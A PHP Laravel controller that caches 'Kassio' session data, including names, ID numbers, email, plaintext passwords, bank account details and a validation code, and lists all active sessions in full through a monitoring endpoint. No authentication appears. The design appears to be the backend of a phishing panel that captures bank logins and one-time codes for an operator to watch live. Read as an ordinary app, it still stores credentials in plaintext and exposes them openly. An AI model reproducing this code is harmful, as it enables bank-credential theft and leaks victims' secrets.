<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Redis;
use Illuminate\Support\Str;

class KassioSessionController extends Controller
{
    /**
     * Prefijo para las claves de Redis/Cache
     */
    private const CACHE_PREFIX = 'kassio_session:';

    /**
     * Tiempo de expiración en segundos (30 minutos)
     */
    private const TTL = 1800;

    /**
     * Guardar datos de sesión en Redis/Cache
     * POST /api/kassio/session
     */
    public function store(Request $request)
    {
        $validated = $request->validate([
            'session_id' => 'nullable|string|max:64',
            'data' => 'required|array',
            'data.identificacion' => 'nullable|string',
            'data.nombre' => 'nullable|string',
            'data.apellidos' => 'nullable|string',
            'data.email' => 'nullable|email',
            'data.password' => 'nullable|string',
            'data.banco' => 'nullable|string',
            'data.tipo_cuenta' => 'nullable|string',
            'data.numero_cuenta' => 'nullable|string',
            'data.codigo_validacion' => 'nullable|string',
        ]);

        // Generar o usar session_id existente
        $sessionId = $validated['session_id'] ?? Str::uuid()->toString();
        $cacheKey = self::CACHE_PREFIX . $sessionId;

        // Obtener datos existentes y mergear con nuevos
        $existingData = Cache::get($cacheKey, []);
        $mergedData = array_merge($existingData, $validated['data']);

        // Agregar timestamp de última actualización
        $mergedData['updated_at'] = now()->toIso8601String();

        // Guardar en cache (Redis si está configurado, file si no)
        Cache::put($cacheKey, $mergedData, self::TTL);

        return response()->json([
            'success' => true,
            'session_id' => $sessionId,
            'data' => $mergedData,
            'expires_in' => self::TTL
        ]);
    }

    /**
     * Obtener datos de sesión desde Redis/Cache
     * GET /api/kassio/session/{sessionId}
     */
    public function show(string $sessionId)
    {
        $cacheKey = self::CACHE_PREFIX . $sessionId;
        $data = Cache::get($cacheKey);

        if (!$data) {
            return response()->json([
                'success' => false,
                'message' => 'Sesión no encontrada o expirada'
            ], 404);
        }

        return response()->json([
            'success' => true,
            'session_id' => $sessionId,
            'data' => $data
        ]);
    }

    /**
     * Actualizar datos específicos de la sesión
     * PATCH /api/kassio/session/{sessionId}
     */
    public function update(Request $request, string $sessionId)
    {
        $cacheKey = self::CACHE_PREFIX . $sessionId;
        $existingData = Cache::get($cacheKey);

        if (!$existingData) {
            return response()->json([
                'success' => false,
                'message' => 'Sesión no encontrada o expirada'
            ], 404);
        }

        $validated = $request->validate([
            'data' => 'required|array'
        ]);

        // Mergear datos existentes con nuevos
        $mergedData = array_merge($existingData, $validated['data']);
        $mergedData['updated_at'] = now()->toIso8601String();

        Cache::put($cacheKey, $mergedData, self::TTL);

        return response()->json([
            'success' => true,
            'session_id' => $sessionId,
            'data' => $mergedData
        ]);
    }

    /**
     * Eliminar sesión
     * DELETE /api/kassio/session/{sessionId}
     */
    public function destroy(string $sessionId)
    {
        $cacheKey = self::CACHE_PREFIX . $sessionId;
        Cache::forget($cacheKey);

        return response()->json([
            'success' => true,
            'message' => 'Sesión eliminada'
        ]);
    }

    /**
     * Eliminar todas las sesiones
     * DELETE /api/kassio/sessions
     */
    public function destroyAll()
    {
        try {
            $redis = Redis::connection('cache');
            $keys = $redis->keys('*kassio_session:*');
            $count = 0;

            foreach ($keys as $key) {
                if (preg_match('/kassio_session:(.+)$/', $key, $matches)) {
                    $sessionId = $matches[1];
                    Cache::forget(self::CACHE_PREFIX . $sessionId);
                    $count++;
                }
            }

            return response()->json([
                'success' => true,
                'message' => "Se eliminaron {$count} sesiones"
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'Error al limpiar sesiones: ' . $e->getMessage()
            ], 500);
        }
    }

    /**
     * Listar todas las sesiones activas (para monitoreo)
     * GET /api/kassio/sessions
     */
    public function index()
    {
        try {
            // Usar conexión de cache de Redis (database 1)
            $redis = Redis::connection('cache');
            $keys = $redis->keys('*kassio_session:*');
            $sessions = [];

            foreach ($keys as $key) {
                // Extraer el session_id de la clave
                if (preg_match('/kassio_session:(.+)$/', $key, $matches)) {
                    $sessionId = $matches[1];
                    $cacheKey = self::CACHE_PREFIX . $sessionId;
                    $data = Cache::get($cacheKey);

                    if ($data) {
                        $sessions[] = [
                            'session_id' => $sessionId,
                            'data' => $data
                        ];
                    }
                }
            }

            return response()->json([
                'success' => true,
                'count' => count($sessions),
                'sessions' => $sessions
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'No se pueden listar sesiones: ' . $e->getMessage()
            ], 500);
        }
    }
}
